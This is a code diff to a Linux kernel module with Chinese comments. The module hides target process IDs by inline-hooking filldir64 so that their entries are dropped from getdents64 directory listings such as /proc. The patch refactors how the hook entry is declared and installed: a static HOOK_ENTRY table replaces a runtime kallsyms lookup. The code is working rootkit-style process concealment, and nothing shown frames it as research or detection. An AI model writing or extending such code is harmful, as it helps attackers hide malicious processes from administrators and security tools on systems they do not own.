@@ -36,7 +36,6 @@
 
 // 隐藏表保存内核侧 pid/tgid 数值；filldir64 里只拿得到目录项 name，所以后面转成字符串比较。
 static pid_t g_hidden_pids[HIDE_TASK_MAX_PIDS];
-static struct hook_entry g_filldir64_hook[1];
 static DEFINE_MUTEX(g_hide_task_lock);
 
 // hook 热路径的快速空表判断：没有隐藏 PID 时直接放行原 filldir64。
@@ -97,10 +96,13 @@ static int filldir64_hook_work(struct pt_regs *regs)
     return 1; // 不继续执行filldir64
 }
 
+static struct hook_entry g_filldir64_hook[] = {
+    HOOK_ENTRY("filldir64", filldir64_hook_work),
+};
+
 // 安装 hook，隐藏目标 pid。
 static int hide_task_install(pid_t pid)
 {
-    unsigned long filldir64_addr;
     int ret = 0;
     int i, empty = -1;
 
@@ -108,27 +110,6 @@ static int hide_task_install(pid_t pid)
         return -EINVAL;
 
     mutex_lock(&g_hide_task_lock);
-
-    if (!g_filldir64_hook[0].target_addr)
-    {
-        // filldir64 是 getdents64 的 actor 本体；符号存在时比改 ctx->actor 更少碰 procfs 内部路径。
-        filldir64_addr = generic_kallsyms_lookup_name("filldir64");
-        if (!filldir64_addr)
-        {
-            ret = -ENOENT;
-            goto out_unlock;
-        }
-
-        g_filldir64_hook[0] = (struct hook_entry){
-            .target_sym = NULL,
-            .target_addr = filldir64_addr,
-            .work_fn = filldir64_hook_work,
-            .trampoline = NULL,
-            .saved_insn = {0},
-            .installed = false,
-            .slot_index = -1,
-        };
-    }
 
     ret = inline_hook_install(g_filldir64_hook);
     if (ret)
